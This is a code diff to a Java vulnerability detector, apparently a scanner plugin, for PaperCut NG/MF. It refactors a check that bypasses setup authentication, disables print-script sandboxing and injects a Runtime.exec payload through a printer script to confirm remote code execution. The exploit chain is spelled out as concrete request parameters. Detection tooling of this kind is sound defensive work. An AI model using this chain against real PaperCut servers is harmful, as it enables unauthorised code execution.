@@ -35,6 +35,7 @@ import java.io.IOException;
 import java.nio.charset.StandardCharsets;
 import java.time.Clock;
 import java.time.Instant;
+import java.util.HashMap;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 import javax.inject.Inject;
@@ -76,169 +77,96 @@ public final class PapercutNGMFVulnDetectorWithPayload implements VulnDetector {
         .build();
   }
 
-  private HttpResponse sendRequestPayload(
-      RequestType reqType,
-      String uri,
-      String body,
-      HttpHeaders headers,
-      NetworkService networkService) {
-    HttpRequest req;
-    ByteString bodyBytes = ByteString.copyFrom(body, StandardCharsets.UTF_8);
-
-    if (reqType == RequestType.POST) {
-      req = HttpRequest.post(uri).setHeaders(headers).setRequestBody(bodyBytes).build();
-    } else {
-      req = HttpRequest.get(uri).setHeaders(headers).build();
-    }
-
-    HttpResponse resp = null;
-    try {
-      resp = this.httpClient.send(req, networkService);
-    } catch (Exception err) {
-      logger.atWarning().withCause(err).log();
-    }
-    return resp;
-  }
-
-  private void changeSettingForPayload(
-      String settingName, Boolean enable, NetworkService networkService, HttpHeaders headers) {
-    String rootUri = NetworkServiceUtils.buildWebApplicationRootUrl(networkService);
-    String settingNav =
-        "service=direct%2F1%2FConfigEditor%2FquickFindForm&sp=S0&Form0=%24TextField%2CdoQuickFind%2Cclear&%24TextField="
-            + settingName
-            + "&doQuickFind=Go";
-    String settingAction =
-        "service=direct%2F1%2FConfigEditor%2F%24Form&sp=S1&Form1=%24TextField%240%2C%24Submit%2C%24Submit%240&%24TextField%240="
-            + (enable ? "Y" : "N")
-            + "&%24Submit=Update";
-
-    // "Navigate" to the page
-    sendRequestPayload(RequestType.POST, rootUri + "app", settingNav, headers, networkService);
-
-    // Enable/Disable the setting
-    sendRequestPayload(RequestType.POST, rootUri + "app", settingAction, headers, networkService);
-  }
-
   private boolean isServiceVulnerable(NetworkService networkService) {
-    String rootUri = NetworkServiceUtils.buildWebApplicationRootUrl(networkService);
     boolean isVulnerable = false;
-    String JSESSION_ID = "";
 
-    // Generate the payload
-    PayloadGeneratorConfig config =
-        PayloadGeneratorConfig.newBuilder()
-            .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.BLIND_RCE)
-            .setInterpretationEnvironment(
-                PayloadGeneratorConfig.InterpretationEnvironment.LINUX_SHELL)
-            .setExecutionEnvironment(
-                PayloadGeneratorConfig.ExecutionEnvironment.EXEC_INTERPRETATION_ENVIRONMENT)
-            .build();
+    PapercutNGMFHelper helper = new PapercutNGMFHelper(networkService, logger, this.httpClient);
 
-    Payload payload = this.payloadGenerator.generate(config);
+    HttpResponse response = helper.sendGetRequest("service=page/SetupCompleted");
+    Matcher bodyContentMatcher =
+            Pattern.compile("Configuration Wizard : Setup Complete")
+                    .matcher(response.bodyString().orElse(""));
 
-    if (!payload.getPayloadAttributes().getUsesCallbackServer()) return false;
+    // If all initial checks pass, then lets check the RCE vuln
+    if ( response.status() == HttpStatus.OK && bodyContentMatcher.find() && !helper.JSESSION_ID.isEmpty()) {
 
-    // Get the JSESSION_ID (if present)
-    HttpHeaders basicHeader = HttpHeaders.builder().addHeader("Origin", rootUri).build();
-    HttpRequest req =
-        HttpRequest.get(rootUri + "app?service=page/SetupCompleted")
-            .setHeaders(basicHeader)
-            .build();
+      // SetupCompleted payload/page
+      HashMap<String, String> setupCompletedPage = new HashMap<String, String>();
+      setupCompletedPage.put("service", "direct/1/SetupCompleted/$Form");
+      setupCompletedPage.put("sp", "S0");
+      setupCompletedPage.put("Form0", "$Hidden,analyticsEnabled,$Submit");
+      setupCompletedPage.put("$Hidden", "true");
+      setupCompletedPage.put("$Submit", "true");
 
-    try {
-      // Try to get the JSESSION_ID cookie and see if the page can be loaded
-      HttpResponse resp = httpClient.send(req, networkService);
-      String setCookiesHeader = resp.headers().get("Set-Cookie").orElse("");
-      String bodyContent = resp.bodyString().orElse("");
+      // Post/send above params
+      helper.sendPostRequest(helper.buildParameterString(setupCompletedPage));
+//      helper.sendGetRequest("service=page/Dashboard");
 
-      Matcher jsessionIdMatcher =
-          Pattern.compile("JSESSIONID=[a-zA-Z0-9.]+;", Pattern.CASE_INSENSITIVE)
-              .matcher(setCookiesHeader);
+      // Changing (or attempting to) change the settings required for RCE
+      helper.changeSettingForPayload("print-and-device.script.enable", true);
+      helper.changeSettingForPayload("print.script.sandboxed", false);
 
-      Matcher bodyContentMatcher =
-          Pattern.compile("Configuration Wizard : Setup Complete").matcher(bodyContent);
+      helper.sendGetRequest("service=page/PrinterList"); // Get list of printers
+      helper.sendGetRequest("service=direct/1/PrinterList/selectPrinter&sp=l1001"); // Get the first one
+      helper.sendGetRequest("service=direct/1/PrinterDetails/printerOptionsTab.tab&sp=4"); // Open up scripting tab
 
-      if (resp.status() == HttpStatus.OK && bodyContentMatcher.find() && jsessionIdMatcher.find()) {
-        JSESSION_ID = jsessionIdMatcher.group();
-        isVulnerable = true;
-      } else {
-        isVulnerable = false;
+      // Let's build and send the actual payload
+      HashMap<String, String> printerScriptPayload = new HashMap<String, String>();
+      printerScriptPayload.put("service", "direct/1/PrinterDetails/$PrinterDetailsScript.$Form");
+      printerScriptPayload.put("sp","S0");
+      printerScriptPayload.put("Form0","printerId,enablePrintScript,scriptBody,$Submit,$Submit$0,$Submit$1");
+      printerScriptPayload.put("printerId","l1001");
+      printerScriptPayload.put("enablePrintScript","on");
+
+      // Build the payload string to inject
+      Payload payload;
+      if (payloadGenerator.isCallbackServerEnabled()) {
+        PayloadGeneratorConfig config =
+                PayloadGeneratorConfig.newBuilder()
+                        .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.BLIND_RCE)
+                        .setInterpretationEnvironment(
+                                PayloadGeneratorConfig.InterpretationEnvironment.LINUX_SHELL)
+                        .setExecutionEnvironment(
+                                PayloadGeneratorConfig.ExecutionEnvironment.EXEC_INTERPRETATION_ENVIRONMENT)
+                        .build();
+
+        payload = this.payloadGenerator.generate(config);
+
+        printerScriptPayload.put("scriptBody","function printJobHook(inputs, actions) {}\r\n" +
+                                 "java.lang.Runtime.getRuntime().exec('" + payload.getPayload() + "');");
+        printerScriptPayload.put("$Submit$1","Apply");
+
+        // Sending payload
+        helper.sendPostRequest(helper.buildParameterString(printerScriptPayload));
+        try { Thread.sleep(1000); } catch (InterruptedException err) { logger.atWarning().withCause(err).log(); }
+
+        // Check payload
+        isVulnerable = payload.checkIfExecuted();
+
+      } else { // If the callback server is not enabled, try to verify the payload through some limited checks.
+        printerScriptPayload.put("scriptBody","function printJobHook(inputs, actions) {}\r\n" +
+                "java.lang.Runtime.getRuntime().exec('hostname');"); // If we can even do this, that's all we really can do
+        printerScriptPayload.put("$Submit$1","Apply");
+
+        // Sending payload
+        HttpResponse payloadResponse = helper.sendPostRequest(helper.buildParameterString(printerScriptPayload));
+
+        Matcher matchResponseResult =
+                Pattern.compile("Saved successfully") // Check for this message in the response
+                        .matcher(payloadResponse.bodyString().orElse(""));
+
+        // If the resulting string in response matched, then the script got submitted and an RCE is possible
+        isVulnerable = matchResponseResult.find();
+
       }
-    } catch (IOException err) {
-      logger.atWarning().withCause(err).log();
-    }
 
-    if (isVulnerable) {
-      // Prepare the PaperCut NG/MF instance for the payload
-      HttpHeaders payloadHeaders =
-          HttpHeaders.builder()
-              .addHeader("Origin", rootUri)
-              .addHeader("Cookie", JSESSION_ID)
-              .addHeader("Content-Type", "application/x-www-form-urlencoded")
-              .build();
-
-      // Login via SetupCompleted page
-      sendRequestPayload(
-          RequestType.POST,
-          rootUri + "app",
-          "service=direct%2F1%2FSetupCompleted%2F%24Form&sp=S0&Form0=%24Hidden%2CanalyticsEnabled%2C%24Submit&%24Hidden=true&%24Submit=Login",
-          payloadHeaders,
-          networkService);
-
-      // Get 'print-and-device.script.enabled' settings and enable it
-      changeSettingForPayload(
-          "print-and-device.script.enable", true, networkService, payloadHeaders);
-
-      // Get 'print.script.sandboxed' settings and enable it
-      changeSettingForPayload("print.script.sandboxed", false, networkService, payloadHeaders);
-
-      // Get list of printers
-      sendRequestPayload(
-          RequestType.GET,
-          rootUri + "app?service=page/PrinterList",
-          "service=page%2FPrinterList",
-          payloadHeaders,
-          networkService);
-
-      // "Select" the printer
-      sendRequestPayload(
-          RequestType.POST,
-          rootUri + "app?service=direct/1/PrinterList/selectPrinter&sp=l1001",
-          "service=direct%2F1%2FPrinterList%2FselectPrinter&sp=l1001",
-          payloadHeaders,
-          networkService);
-
-      // Select the Scripting tab
-      sendRequestPayload(
-          RequestType.POST,
-          rootUri + "app",
-          "service=direct%2F1%2FPrinterDetails%2FprinterOptionsTab.tab&sp=4",
-          payloadHeaders,
-          networkService);
-
-      // Apply the RCE Payload
-      String rceInjection = payload.getPayload();
-
-      sendRequestPayload(
-          RequestType.POST,
-          rootUri + "app",
-          "service=direct%2F1%2FPrinterDetails%2F%24PrinterDetailsScript.%24Form&sp=S0&Form0=printerId%2CenablePrintScript%2CscriptBody%2C%24Submit%2C%24Submit%240%2C%24Submit%241&printerId=l1001&enablePrintScript=on&scriptBody=function+printJobHook%28inputs%2C+actions%29+%7B%7D%0D%0Ajava.lang.Runtime.getRuntime%28%29.exec%28%27"
-              + rceInjection
-              + "%27%29%3B&%24Submit%241=Apply",
-          payloadHeaders,
-          networkService);
-
-      isVulnerable = payload.checkIfExecuted();
-
-      // Revert the previously changed settings (not necessary, but helps keep a light touch and
-      // clean environment)
-      changeSettingForPayload(
-          "print-and-device.script.enable", false, networkService, payloadHeaders);
-      changeSettingForPayload("print.script.sandboxed", true, networkService, payloadHeaders);
+      // Changing (or attempting to) change the settings required for RCE
+      helper.changeSettingForPayload("print-and-device.script.enable", false);
+      helper.changeSettingForPayload("print.script.sandboxed", true);
 
       return isVulnerable;
     }
-    return false; // by default
+    return false; // Do this as default
   }
 
   private DetectionReport buildDetectionReport(
